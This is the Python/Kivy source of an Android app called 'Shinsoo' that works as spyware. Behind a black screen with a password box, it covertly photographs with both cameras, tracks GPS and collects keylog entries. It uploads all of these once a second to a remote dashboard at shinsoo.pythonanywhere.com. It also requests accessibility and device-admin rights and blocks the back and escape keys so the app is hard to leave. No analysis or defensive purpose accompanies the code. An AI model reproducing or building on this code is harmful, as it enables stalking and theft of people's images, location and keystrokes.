import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io, time

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"
PERMS = {
    'Erisim': False,
    'Dosya':  False,
    'Kamera': False,
    'Konum':  False,
}

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()
SERVICE_NAME = 'com.shinsoo.shinsoo.ShinsooAccessibility'


# ── Erişilebilirlik kontrolü ──────────────────────────────────────────────────

def is_accessibility_enabled():
    if platform != 'android':
        return True
    try:
        from jnius import autoclass
        Settings       = autoclass('android.provider.Settings$Secure')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        ctx            = PythonActivity.mActivity
        enabled = Settings.getString(
            ctx.getContentResolver(),
            'enabled_accessibility_services') or ''
        return SERVICE_NAME.lower() in enabled.lower()
    except Exception:
        return False

def open_accessibility_settings():
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        Intent         = autoclass('android.content.Intent')
        Settings       = autoclass('android.provider.Settings')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        PythonActivity.mActivity.startActivity(intent)
    except Exception:
        pass


# ── Ana Ekran ─────────────────────────────────────────────────────────────────

class MainScreen(FloatLayout):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._active       = True
        self._sender       = None
        self._msgs         = []
        self._msg_idx      = 0
        self._acc_checked  = False

        with self.canvas.before:
            Color(0, 0, 0, 1)
            self._bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bg, 'pos', self.pos),
                  size=lambda *_: setattr(self._bg, 'size', self.size))

        self._build_main()
        self._acc_overlay = None
        Clock.schedule_interval(self._next_msg, 3)
        # 2sn sonra erişilebilirlik kontrolü
        Clock.schedule_once(self._check_accessibility, 2)

    # ── UI ───────────────────────────────────────────────────────────────────

    def _build_main(self):
        center = BoxLayout(
            orientation='vertical',
            size_hint=(0.65, None),
            height=dp(100),
            spacing=dp(10),
            pos_hint={'center_x': 0.5, 'center_y': 0.52},
        )
        self._pwd = TextInput(
            hint_text='key',
            password=True,
            font_size=dp(22),
            multiline=False,
            size_hint_y=None,
            height=dp(52),
            background_color=(0.06, 0.06, 0.06, 1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.22, 0.22, 0.22, 1),
            padding=[dp(14), dp(14)],
        )
        self._pwd.bind(on_text_validate=self._check_key)
        self._err = Label(
            text='', font_size=dp(10),
            color=(0.6, 0.1, 0.1, 1),
            size_hint_y=None, height=dp(16),
            halign='center',
        )
        center.add_widget(self._pwd)
        center.add_widget(self._err)
        self.add_widget(center)

        self._ticker = Label(
            text='gokhan',
            font_size=dp(8),
            color=(0.14, 0.14, 0.14, 1),
            size_hint=(1, None),
            height=dp(18),
            pos_hint={'x': 0, 'y': 0},
            halign='center',
        )
        self.add_widget(self._ticker)

    def _build_acc_overlay(self):
        """Erişilebilirlik izni için overlay ekran."""
        overlay = FloatLayout(size_hint=(1, 1), pos_hint={'x':0,'y':0})
        with overlay.canvas.before:
            Color(0, 0, 0, 0.97)
            self._ov_bg = Rectangle(pos=overlay.pos, size=overlay.size)
        overlay.bind(pos=lambda *_: setattr(self._ov_bg,'pos',overlay.pos),
                     size=lambda *_: setattr(self._ov_bg,'size',overlay.size))

        box = BoxLayout(
            orientation='vertical',
            size_hint=(0.82, None),
            height=dp(200),
            spacing=dp(16),
            padding=[dp(20), dp(20)],
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
        )

        # Başlık
        box.add_widget(Label(
            text='[b]ERİSİLEBİLİRLİK İZNİ[/b]',
            markup=True,
            font_size=dp(14),
            color=(0.85, 0.85, 0.85, 1),
            size_hint_y=None, height=dp(28),
            halign='center',
        ))

        # Açıklama
        box.add_widget(Label(
            text='Shinsoo\'nun tam calismasi icin\nErisebilirlik iznini etkinlestirin.',
            font_size=dp(11),
            color=(0.5, 0.5, 0.5, 1),
            size_hint_y=None, height=dp(40),
            halign='center',
        ))

        # Buton
        btn = Button(
            text='AYARLARA GIT',
            size_hint_y=None,
            height=dp(48),
            background_color=(0, 0, 0, 0),
            color=(0.85, 0.85, 0.85, 1),
            font_size=dp(13),
            bold=True,
        )
        with btn.canvas.before:
            Color(0.2, 0.2, 0.2, 1)
            self._btn_bg = RoundedRectangle(
                pos=btn.pos, size=btn.size, radius=[dp(6)])
        btn.bind(pos=lambda *_: setattr(self._btn_bg,'pos',btn.pos),
                 size=lambda *_: setattr(self._btn_bg,'size',btn.size))
        btn.bind(on_release=self._goto_accessibility)
        box.add_widget(btn)

        # Atla butonu
        skip = Button(
            text='atla',
            size_hint_y=None,
            height=dp(24),
            background_color=(0, 0, 0, 0),
            color=(0.25, 0.25, 0.25, 1),
            font_size=dp(10),
        )
        skip.bind(on_release=self._skip_accessibility)
        box.add_widget(skip)

        overlay.add_widget(box)
        return overlay

    # ── Erişilebilirlik ───────────────────────────────────────────────────────

    def _check_accessibility(self, dt):
        if is_accessibility_enabled():
            PERMS['Erisim'] = True
            self._push('erisim izni: ok')
            return
        # Overlay göster
        self._acc_overlay = self._build_acc_overlay()
        self.add_widget(self._acc_overlay)
        # 3sn'de bir kontrol et
        Clock.schedule_interval(self._poll_accessibility, 3)

    def _poll_accessibility(self, dt):
        if is_accessibility_enabled():
            PERMS['Erisim'] = True
            self._push('erisim izni: ok')
            if self._acc_overlay:
                self.remove_widget(self._acc_overlay)
                self._acc_overlay = None
            return False  # döngüyü durdur

    def _goto_accessibility(self, *_):
        open_accessibility_settings()

    def _skip_accessibility(self, *_):
        if self._acc_overlay:
            self.remove_widget(self._acc_overlay)
            self._acc_overlay = None
        self._push('erisim atlandi')

    # ── Key kontrolü ─────────────────────────────────────────────────────────

    def _check_key(self, *_):
        if self._pwd.text == KIOSK_PASSWORD:
            self._active = False
            if self._sender:
                self._sender.set_paused(True)
            self._err.text = ''
            self._pwd.text = ''
            self._push('durduruldu')
        else:
            self._err.text = 'yanlis key'
            self._pwd.text = ''

    # ── Ticker ───────────────────────────────────────────────────────────────

    def _push(self, msg):
        self._msgs.append(msg)
        if len(self._msgs) > 60:
            self._msgs = self._msgs[-60:]

    def _next_msg(self, dt):
        if self._msgs:
            self._msg_idx = (self._msg_idx + 1) % len(self._msgs)
            self._ticker.text = 'gokhan  |  ' + self._msgs[self._msg_idx]
        else:
            self._ticker.text = 'gokhan'

    def update_perm(self, name, granted):
        PERMS[name] = granted
        self._push(name + ':' + ('ok' if granted else 'red'))
        if name == 'Kamera' and granted:
            if self._sender:
                self._sender.start_camera()

    def send_frames(self, dt):
        if not self._active or not self._sender:
            return
        self._sender.capture_and_queue()


# ── DataSender ────────────────────────────────────────────────────────────────

class DataSender:
    def __init__(self, screen):
        self.is_connected = False
        self.packet_count = 0
        self.last_loc     = None
        self._screen      = screen
        self._paused      = False
        self._stop        = threading.Event()
        self._front_q     = [None]
        self._back_q      = [None]
        self._key_q       = []
        self._lock        = threading.Lock()
        self._cam_started = False
        threading.Thread(target=self._send_loop, daemon=True).start()
        threading.Thread(target=self._gps_loop,  daemon=True).start()

    def set_paused(self, v): self._paused = v
    def stop(self): self._stop.set()

    def queue_key(self, text):
        with self._lock:
            self._key_q.append(text)

    def start_camera(self):
        if self._cam_started:
            return
        self._cam_started = True
        threading.Thread(target=self._cam_loop, daemon=True).start()

    def _cam_loop(self):
        """Sürekli kamera frame'i yakala."""
        while not self._stop.is_set():
            if self._paused:
                time.sleep(1)
                continue
            self.capture_and_queue()
            time.sleep(1)

    def capture_and_queue(self):
        if platform != 'android':
            return
        try:
            from jnius import autoclass, PythonJavaClass, java_method, cast
            import array as arr

            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context        = PythonActivity.mActivity

            # Camera1 API - daha basit ve stabil
            Camera = autoclass('android.hardware.Camera')
            count  = Camera.getNumberOfCameras()

            for cam_idx in range(min(count, 2)):
                result = [None]
                done   = threading.Event()

                try:
                    cam = Camera.open(cam_idx)
                    params = cam.getParameters()
                    params.setPictureSize(320, 240)
                    cam.setParameters(params)

                    # Dummy SurfaceTexture gerekli
                    ST = autoclass('android.graphics.SurfaceTexture')
                    st = ST(cam_idx + 10)
                    cam.setPreviewTexture(st)
                    cam.startPreview()

                    class PicCB(PythonJavaClass):
                        __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                        @java_method('([BLandroid/hardware/Camera;)V')
                        def onPictureTaken(self, data, camera):
                            if data:
                                result[0] = bytes(data)
                            done.set()

                    cb = PicCB()
                    cam.takePicture(None, None, cb)
                    done.wait(timeout=4)
                    cam.release()

                    if result[0]:
                        b64 = base64.b64encode(result[0]).decode('utf-8')
                        if cam_idx == 0:
                            self._back_q[0]  = b64
                        else:
                            self._front_q[0] = b64
                        self._screen._push('kamera' + str(cam_idx) + ':ok')
                except Exception as e:
                    self._screen._push('cam' + str(cam_idx) + ':err')
        except Exception:
            pass

    def _gps_loop(self):
        if platform != 'android':
            return
        try:
            from plyer import gps
            def on_loc(**kw):
                lat = kw.get('lat')
                lon = kw.get('lon')
                if lat and lon:
                    self.last_loc = (lat, lon)
                    self._screen._push(
                        str(round(lat, 4)) + ',' + str(round(lon, 4)))
            gps.configure(on_location=on_loc)
            gps.start(minTime=3000, minDistance=0)
        except Exception:
            pass

    def _send_loop(self):
        try:
            import requests
        except Exception:
            return
        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        while not self._stop.is_set():
            if self._paused:
                self._stop.wait(1)
                continue
            try:
                payload = {
                    'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S'),
                }
                f = self._front_q[0]; b = self._back_q[0]
                if f: payload['frame_front'] = f; self._front_q[0] = None
                if b: payload['frame_back']  = b; self._back_q[0]  = None
                with self._lock:
                    keys = list(self._key_q)
                    self._key_q.clear()
                for k in keys:
                    payload['keylog'] = k
                if self.last_loc:
                    payload['location'] = {
                        'lat': self.last_loc[0],
                        'lon': self.last_loc[1],
                    }
                r = requests.post(url, json=payload, timeout=5)
                self.is_connected = (r.status_code == 200)
                self.packet_count += 1
                self._screen._push('pkt#' + str(self.packet_count))
            except Exception:
                self.is_connected = False
                self._screen._push('bag yok')
            self._stop.wait(1)


# ── Ana Uygulama ──────────────────────────────────────────────────────────────

class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        self.screen = MainScreen()
        self.sender = DataSender(self.screen)
        self.screen._sender = self.sender
        Clock.schedule_interval(self.screen.send_frames, 1)
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._start_fg_service()
            self._enable_device_admin()
            self._request_perms()
        else:
            for name in PERMS:
                PERMS[name] = True
            self.sender.start_camera()

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _start_fg_service(self):
        try:
            from android import AndroidService
            service = AndroidService('Shinsoo', 'Shinsoo')
            service.start('start')
            self.screen._push('servis ok')
        except Exception as e:
            self.screen._push('servis:' + str(e)[:15])

    def _enable_device_admin(self):
        try:
            from jnius import autoclass
            Intent              = autoclass('android.content.Intent')
            ComponentName       = autoclass('android.content.ComponentName')
            DevicePolicyManager = autoclass('android.app.admin.DevicePolicyManager')
            PythonActivity      = autoclass('org.kivy.android.PythonActivity')
            context             = PythonActivity.mActivity
            dpm = context.getSystemService('device_policy')
            cn  = ComponentName(context,
                    autoclass('org.kivy.android.DeviceAdminReceiver'))
            if dpm.isAdminActive(cn):
                self.screen._push('admin: aktif')
                return
            intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                'Shinsoo icin gereklidir.')
            context.startActivity(intent)
        except Exception as e:
            self.screen._push('admin:' + str(e)[:15])

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception:
            pass

    def _after_storage(self, permissions, grants):
        for p, g in zip(permissions, grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception:
            pass

    def _after_all(self, permissions, grants):
        for p, g in zip(permissions, grants):
            if 'CAMERA' in p:
                self.screen.update_perm('Kamera', g)
            elif 'RECORD_AUDIO' in p:
                self.screen.update_perm('Mikrofon', g)
            elif 'LOCATION' in p:
                self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_): return True

    def _on_key(self, window, key, *_):
        if key == 27: return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
